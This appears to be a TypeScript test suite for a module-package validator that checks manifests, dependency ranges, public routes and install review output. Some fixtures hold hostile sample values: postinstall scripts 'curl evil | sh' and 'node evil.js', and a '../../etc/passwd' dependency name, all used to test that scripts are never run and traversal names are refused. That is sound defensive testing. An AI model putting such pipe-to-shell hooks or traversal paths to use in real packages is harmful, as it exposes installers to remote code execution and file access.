import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeEach, describe, it } from "node:test";
import { SDK_VERSION } from "@modunexo/sdk";
import { type PackageContext, validatePackageTree } from "../src/packages/validate.ts";

let root: string;
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "modunexo-validate-"));
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

const put = (path: string, content: string) => {
  mkdirSync(dirname(join(root, path)), { recursive: true });
  writeFileSync(join(root, path), content);
};

const manifest = (overrides: Record<string, unknown> = {}) => ({
  id: "reports",
  version: "1.2.0",
  name: "Reports",
  platform: `^${SDK_VERSION}`,
  dependsOn: {},
  schema: "reports",
  migrationsDir: "migrations",
  nav: [{ label: "Reports", href: "/reports", icon: "chart" }],
  pages: [{ path: "/reports", entry: "./web/page.tsx", kind: "page" }],
  ...overrides,
});

/** A package that is fine, written to `root`. A test breaks one thing at a time. */
function writeGood(options: { manifest?: Record<string, unknown>; packageJson?: Record<string, unknown> } = {}) {
  put("package.json", JSON.stringify({ name: "@acme/reports", version: "1.2.0", ...options.packageJson }));
  put("manifest.json", JSON.stringify(manifest(options.manifest)));
  put("manifest.ts", "export default {};");
  put("migrations/0001_init.sql", "create table items (id int);");
  put("migrations/0002_more.sql", "alter table items add column n int;");
  put("web/page.tsx", "export default () => null;");
}

const INSTALLED: Record<string, string> = { react: "19.3.0", next: "16.4.0", "lucide-react": "1.55.0" };
const context = (overrides: Partial<PackageContext> = {}): PackageContext => ({
  sdkVersion: SDK_VERSION,
  installedVersion: (name) => INSTALLED[name] ?? null,
  modules: new Map(),
  modulePackages: new Map(),
  ...overrides,
});

const problemsOf = (ctx = context()) => {
  const result = validatePackageTree(root, ctx);
  assert.equal(result.ok, false, "expected the package to be refused");
  return result.ok ? "" : result.problems.join("\n");
};

describe("validatePackageTree: jobs", () => {
  it("shows the jobs in the review, with the interval of a repeating one", () => {
    writeGood({
      manifest: {
        jobs: [
          { name: "sync", entry: "./web/page.tsx" },
          { name: "cleanup", entry: "./web/page.tsx", every: "1h" },
        ],
      },
    });
    const result = validatePackageTree(root, context());
    assert.equal(result.ok, true, result.ok ? "" : result.problems.join("\n"));
    if (!result.ok) return;
    assert.deepEqual(result.review.jobs, [{ name: "sync" }, { name: "cleanup", every: "1h" }]);
  });

  it("refuses a job whose file is not in the package", () => {
    writeGood({ manifest: { jobs: [{ name: "sync", entry: "./jobs/missing.ts" }] } });
    assert.match(problemsOf(), /jobs\[0\]\.entry/);
  });

  it("lists no jobs for a module that declares none", () => {
    writeGood();
    const result = validatePackageTree(root, context());
    assert.equal(result.ok, true);
    if (result.ok) assert.deepEqual(result.review.jobs, []);
  });
});

describe("validatePackageTree: events", () => {
  it("shows the events, whether a browser can follow each, and the subscriptions", () => {
    writeGood({
      manifest: {
        permissions: [{ key: "read", label: "Read" }],
        jobs: [{ name: "react", entry: "./web/page.tsx" }],
        events: [{ name: "created", permission: "read" }, { name: "internal" }],
        subscriptions: [{ event: "reports.created", job: "react" }],
      },
    });
    const result = validatePackageTree(root, context());
    assert.equal(result.ok, true, result.ok ? "" : result.problems.join("\n"));
    if (!result.ok) return;
    assert.deepEqual(result.review.events, [{ name: "created", streamed: true }, { name: "internal", streamed: false }]);
    assert.deepEqual(result.review.subscriptions, [{ event: "reports.created", job: "react" }]);
  });

  it("lists no events or subscriptions for a module that declares none", () => {
    writeGood();
    const result = validatePackageTree(root, context());
    assert.equal(result.ok, true);
    if (result.ok) assert.deepEqual([result.review.events, result.review.subscriptions], [[], []]);
  });
});

describe("validatePackageTree: files", () => {
  it("shows the limit, the accepted types and whether a browser can download", () => {
    writeGood({ manifest: { permissions: [{ key: "read", label: "Read" }], files: { maxBytes: 1024, accept: ["image/png", "text/*"], permission: "read" } } });
    const result = validatePackageTree(root, context());
    assert.equal(result.ok, true, result.ok ? "" : result.problems.join("\n"));
    if (result.ok) assert.deepEqual(result.review.files, { maxBytes: 1024, accept: ["image/png", "text/*"], downloadable: true });
  });

  it("shows the defaults for an empty declaration, and nothing for a module that stores no files", () => {
    writeGood({ manifest: { files: {} } });
    const stores = validatePackageTree(root, context());
    assert.equal(stores.ok, true);
    if (stores.ok) assert.deepEqual(stores.review.files, { maxBytes: 10 * 1024 * 1024, accept: null, downloadable: false });
    writeGood();
    const plain = validatePackageTree(root, context());
    assert.equal(plain.ok, true);
    if (plain.ok) assert.equal(plain.review.files, null);
  });
});

describe("validatePackageTree: public routes", () => {
  it("shows a public route in the review, so the person who installs sees what opens", () => {
    writeGood({
      manifest: {
        settings: [{ key: "webhook_secret", label: "Webhook secret", type: "secret" }],
        pages: [
          { path: "/reports", entry: "./web/page.tsx", kind: "page" },
          {
            path: "/hooks/reports/inbound",
            entry: "./web/page.tsx",
            kind: "route",
            methods: ["POST"],
            public: { signature: { secret: "webhook_secret", header: "x-signature" } },
          },
        ],
      },
    });
    const result = validatePackageTree(root, context());
    assert.equal(result.ok, true, result.ok ? "" : result.problems.join("\n"));
    if (!result.ok) return;
    assert.deepEqual(result.review.pages, [
      { path: "/reports", kind: "page" },
      { path: "/hooks/reports/inbound", kind: "route", public: true },
    ]);
  });

  it("shows scopes and token routes in the review", () => {
    writeGood({
      manifest: {
        scopes: [{ key: "reports.read", label: "Read reports" }],
        pages: [
          { path: "/reports", entry: "./web/page.tsx", kind: "page" },
          { path: "/svc/reports/list", entry: "./web/page.tsx", kind: "route", scope: "reports.read" },
        ],
      },
    });
    const result = validatePackageTree(root, context());
    assert.equal(result.ok, true, result.ok ? "" : result.problems.join("\n"));
    if (!result.ok) return;
    assert.deepEqual(result.review.scopes, [{ key: "reports.read", label: "Read reports" }]);
    assert.deepEqual(result.review.pages, [
      { path: "/reports", kind: "page" },
      { path: "/svc/reports/list", kind: "route", scope: "reports.read" },
    ]);
  });

  it("refuses a public route without a signature", () => {
    writeGood({
      manifest: {
        pages: [{ path: "/hooks/reports/inbound", entry: "./web/page.tsx", kind: "route", methods: ["POST"], public: {} }],
      },
    });
    assert.match(problemsOf(), /signature/);
  });
});

describe("validatePackageTree: a good package", () => {
  it("is accepted and described", () => {
    writeGood({
      manifest: {
        permissions: [{ key: "reports.read", label: "Read" }],
        settings: [{ key: "title", label: "Title", type: "string", default: "x" }, { key: "token", label: "Token", type: "secret", required: true }],
        hooks: "./hooks.ts",
        dependsOn: { documents: "^1.0.0", billing: "^2.0.0", crm: "^1.0.0" },
        pages: [{ path: "/reports", entry: "./web/page.tsx", kind: "page", permission: "reports.read" }],
      },
      packageJson: { dependencies: { react: "^19.0.0", "lucide-react": "^1.0.0" }, scripts: { postinstall: "node evil.js", build: "tsc" }, devDependencies: { vitest: "^1" } },
    });
    put("hooks.ts", "export const onInstall = () => {};");
    const result = validatePackageTree(root, context({ modules: new Map([["documents", "1.4.0"], ["billing", "1.0.0"]]) }));
    assert.equal(result.ok, true, JSON.stringify(result));
    if (!result.ok) return;
    const review = result.review;
    assert.deepEqual(
      { id: review.id, version: review.version, name: review.name, packageName: review.packageName },
      { id: "reports", version: "1.2.0", name: "Reports", packageName: "@acme/reports" },
    );
    assert.deepEqual(review.migrations, ["0001_init.sql", "0002_more.sql"]);
    assert.equal(review.runsHooks, true);
    assert.deepEqual(review.pages, [{ path: "/reports", kind: "page", permission: "reports.read" }]);
    assert.deepEqual(review.permissions, [{ key: "reports.read", label: "Read" }]);
    assert.deepEqual(review.settings, [
      { key: "title", type: "string", required: false, hasDefault: true },
      { key: "token", type: "secret", required: true, hasDefault: false },
    ]);
    assert.deepEqual(review.dependencies, [
      { name: "lucide-react", range: "^1.0.0", installed: "1.55.0" },
      { name: "react", range: "^19.0.0", installed: "19.3.0" },
    ]);
    assert.deepEqual(review.dependsOn, [
      { id: "billing", range: "^2.0.0", status: "mismatch", installed: "1.0.0" },
      { id: "crm", range: "^1.0.0", status: "missing" },
      { id: "documents", range: "^1.0.0", status: "satisfied", installed: "1.4.0" },
    ]);
    assert.deepEqual(review.scripts, ["build", "postinstall"], "scripts are listed so the owner sees them, and are never run");
  });

  it("reports a package without hooks as running none", () => {
    writeGood();
    const result = validatePackageTree(root, context());
    assert.equal(result.ok && result.review.runsHooks, false);
  });
});

describe("validatePackageTree: files and metadata", () => {
  it("package.json missing, not JSON, or not an object", () => {
    writeGood();
    rmSync(join(root, "package.json"));
    assert.match(problemsOf(), /package\.json is missing/);
    put("package.json", "{ nope");
    assert.match(problemsOf(), /package\.json is not valid JSON/);
    put("package.json", "[1,2]");
    assert.match(problemsOf(), /package\.json must be a JSON object/);
  });

  it("manifest.json missing or not a valid manifest, repeating what the validator says", () => {
    writeGood();
    rmSync(join(root, "manifest.json"));
    assert.match(problemsOf(), /manifest\.json is missing/);
    put("manifest.json", JSON.stringify(manifest({ id: "Not Kebab", version: "x" })));
    const problems = problemsOf();
    assert.match(problems, /manifest\.json is not a valid manifest/);
    assert.match(problems, /id/);
  });

  it("manifest.ts missing, because the platform loads it at install", () => {
    writeGood();
    rmSync(join(root, "manifest.ts"));
    assert.match(problemsOf(), /manifest\.ts is missing/);
  });

  it("the package version and the manifest version disagreeing", () => {
    writeGood({ packageJson: { version: "9.9.9" } });
    assert.match(problemsOf(), /version "9\.9\.9".*manifest.*"1\.2\.0"/s);
  });

  it("a package name in the platform's own scope, or one that is not a valid name", () => {
    writeGood({ packageJson: { name: "@modunexo/core" } });
    assert.match(problemsOf(), /@modunexo/);
    writeGood({ packageJson: { name: "Bad Name!" } });
    assert.match(problemsOf(), /not a valid package name/);
  });

  it("a package name that is an installed library, unless it is this module's own name", () => {
    writeGood({ packageJson: { name: "react" } });
    assert.match(problemsOf(), /collides with the installed package "react"/);
    assert.equal(validatePackageTree(root, context({ modulePackages: new Map([["reports", "react"]]) })).ok, true);
  });

  it("an entry or hooks file that is not there, and a migrations folder that is missing or badly named", () => {
    writeGood({ manifest: { hooks: "./hooks.ts" } });
    assert.match(problemsOf(), /hooks "\.\/hooks\.ts" does not exist/);
    writeGood();
    rmSync(join(root, "web/page.tsx"));
    assert.match(problemsOf(), /pages\[0\]\.entry "\.\/web\/page\.tsx" does not exist/);
    writeGood();
    rmSync(join(root, "migrations"), { recursive: true });
    assert.match(problemsOf(), /migrations folder "migrations" does not exist/);
    writeGood();
    put("migrations/bad name.sql", "select 1;");
    assert.match(problemsOf(), /migration file "bad name\.sql"/);
  });

  it("an entry that is a folder and not a file", () => {
    writeGood();
    rmSync(join(root, "web/page.tsx"));
    mkdirSync(join(root, "web/page.tsx"));
    assert.match(problemsOf(), /pages\[0\]\.entry .* is not a file/);
  });

  it("a page at a path the shell keeps for itself", () => {
    writeGood({ manifest: { pages: [{ path: "/settings/extra", entry: "./web/page.tsx", kind: "page" }], nav: [] } });
    assert.match(problemsOf(), /\/settings\/extra.*reserved for the shell/);
  });

  it("a platform range this platform does not satisfy", () => {
    writeGood({ manifest: { platform: "^9.0.0" } });
    assert.match(problemsOf(), /needs platform \^9\.0\.0, this platform is/);
  });

  it("a JSON file that is absurdly large", () => {
    writeGood();
    put("package.json", JSON.stringify({ name: "@acme/reports", version: "1.2.0", pad: "x".repeat(2 * 1024 * 1024) }));
    assert.match(problemsOf(), /package\.json is larger than/);
  });
});

describe("validatePackageTree: dependencies are the platform's", () => {
  it("a dependency that is not installed, naming it", () => {
    writeGood({ packageJson: { dependencies: { "left-pad": "^1.0.0" } } });
    assert.match(problemsOf(), /"left-pad" is not installed in the platform/);
  });

  it("an installed dependency whose version does not satisfy the range", () => {
    writeGood({ packageJson: { dependencies: { react: "^18.0.0" } } });
    assert.match(problemsOf(), /"react" \^18\.0\.0 is not satisfied by the installed 19\.3\.0/);
  });

  it("a range that is not a semver range: a git URL, a file, a workspace link, a tag, a URL", () => {
    for (const range of ["git+https://github.com/x/y.git", "file:../y", "workspace:*", "latest", "https://example.com/x.tgz", "github:x/y"]) {
      writeGood({ packageJson: { dependencies: { react: range } } });
      assert.match(problemsOf(), /"react".*is not a semver range/, range);
    }
  });

  it("peer and optional dependencies count the same, and bundled ones are refused", () => {
    writeGood({ packageJson: { peerDependencies: { "left-pad": "^1" } } });
    assert.match(problemsOf(), /"left-pad" is not installed/);
    writeGood({ packageJson: { optionalDependencies: { "left-pad": "^1" } } });
    assert.match(problemsOf(), /"left-pad" is not installed/);
    writeGood({ packageJson: { bundledDependencies: ["x"] } });
    assert.match(problemsOf(), /bundled dependencies are not accepted/);
    writeGood({ packageJson: { bundleDependencies: true } });
    assert.match(problemsOf(), /bundled dependencies are not accepted/);
  });

  it("the SDK is checked against the SDK version of this platform", () => {
    writeGood({ packageJson: { peerDependencies: { "@modunexo/sdk": `^${SDK_VERSION}` } } });
    assert.equal(validatePackageTree(root, context()).ok, true);
    writeGood({ packageJson: { peerDependencies: { "@modunexo/sdk": "^9.0.0" } } });
    assert.match(problemsOf(), /"@modunexo\/sdk" \^9\.0\.0 is not satisfied by the installed/);
  });

  it("a dependency name that is a path is refused before anything looks it up", () => {
    const asked: string[] = [];
    writeGood({ packageJson: { dependencies: { "../../etc/passwd": "^1", "/abs": "^1", "a b": "^1" } } });
    const result = validatePackageTree(root, context({ installedVersion: (name) => (asked.push(name), null) }));
    assert.equal(result.ok, false);
    // The package's own name is looked up (to catch a collision); the hostile dependency names never are.
    assert.deepEqual(asked.filter((name) => name !== "@acme/reports"), [], "the lookup never saw a hostile name");
  });

  it("devDependencies and scripts are not a reason to refuse", () => {
    writeGood({ packageJson: { devDependencies: { "left-pad": "^1" }, scripts: { postinstall: "curl evil | sh" } } });
    assert.equal(validatePackageTree(root, context()).ok, true);
  });

  it("lists every problem it finds", () => {
    writeGood({ packageJson: { version: "9.9.9", dependencies: { "left-pad": "^1" } }, manifest: { platform: "^9.0.0" } });
    rmSync(join(root, "web/page.tsx"));
    const problems = problemsOf();
    assert.match(problems, /version/);
    assert.match(problems, /left-pad/);
    assert.match(problems, /platform/);
    assert.match(problems, /page\.tsx/);
  });
});
